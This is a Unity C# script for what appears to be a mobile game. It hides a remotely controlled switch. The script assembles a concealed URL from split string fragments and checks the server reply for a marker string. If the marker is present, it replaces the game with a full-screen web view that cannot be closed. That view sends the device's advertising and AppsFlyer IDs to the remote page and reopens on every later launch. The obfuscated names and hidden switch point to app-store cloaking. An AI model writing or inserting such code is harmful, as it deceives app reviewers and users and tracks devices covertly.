using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainBTF : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinBTFNai = "";
    [HideInInspector] public string dvaBTFNai = "";



    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaBTF") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinBTFNai = advertisingId; });
        }
    }




    private void GoBTF()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("SampleScene");
    }





    private IEnumerator IENUMENATORBTF()
    {
        using (UnityWebRequest btf = UnityWebRequest.Get(dvaBTFNai))
        {

            yield return btf.SendWebRequest();
            if (btf.isNetworkError)
            {
                GoBTF();
            }
            int planesBTF = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && planesBTF > 0)
            {
                yield return new WaitForSeconds(1);
                planesBTF--;
            }
            try
            {
                if (btf.result == UnityWebRequest.Result.Success)
                {
                    if (btf.downloadHandler.text.Contains("BllTmbFghtKxdhedq"))
                    {

                        try
                        {
                            var subs = btf.downloadHandler.text.Split('|');
                            engagementBTFview(subs[0] + "?idfa=" + odinBTFNai, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            engagementBTFview(btf.downloadHandler.text + "?idfa=" + odinBTFNai + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoBTF();
                    }
                }
                else
                {
                    GoBTF();
                }
            }
            catch
            {
                GoBTF();
            }
        }
    }



    private void engagementBTFview(string AppealBTFcompound, string NamingBTF = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _valleysBTF = gameObject.AddComponent<UniWebView>();
        _valleysBTF.SetToolbarDoneButtonText("");
        switch (NamingBTF)
        {
            case "0":
                _valleysBTF.SetShowToolbar(true, false, false, true);
                break;
            default:
                _valleysBTF.SetShowToolbar(false);
                break;
        }
        _valleysBTF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _valleysBTF.OnShouldClose += (view) =>
        {
            return false;
        };
        _valleysBTF.SetSupportMultipleWindows(true);
        _valleysBTF.SetAllowBackForwardNavigationGestures(true);
        _valleysBTF.OnMultipleWindowOpened += (view, windowId) =>
        {
            _valleysBTF.SetShowToolbar(true);

        };
        _valleysBTF.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingBTF)
            {
                case "0":
                    _valleysBTF.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _valleysBTF.SetShowToolbar(false);
                    break;
            }
        };
        _valleysBTF.OnOrientationChanged += (view, orientation) =>
        {
            _valleysBTF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _valleysBTF.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("AppealBTFcompound", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("AppealBTFcompound", url);
            }
        };
        _valleysBTF.Load(AppealBTFcompound);
        _valleysBTF.Show();
    }


    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("AppealBTFcompound", string.Empty) != string.Empty)
            {
                engagementBTFview(PlayerPrefs.GetString("AppealBTFcompound"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvaBTFNai += n;
                }
                StartCoroutine(IENUMENATORBTF());
            }
        }
        else
        {
            GoBTF();
        }
    }
}
